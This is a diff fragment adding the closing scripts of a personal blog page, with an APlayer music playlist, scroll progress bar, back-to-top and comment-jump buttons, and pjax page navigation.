+  const musics = JSON.parse(`[{"name":"开学第一课","artist":"TF","url":"music/kaxue.mp3","cover":"https://img0.baidu.com/it/u=2321605470,2261684769&fm=253&fmt=auto&app=138&f=JPEG?w=667&h=500"},{"name":"卡布达","artist":"暂无","url":"music/kabuda.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"八连杀","artist":"苏三","url":"music/八连杀.mp3","cover":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQo0SWQx6YrNA8lElaG4OOKLkNkNzLO1PflKg&usqp=CAU"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
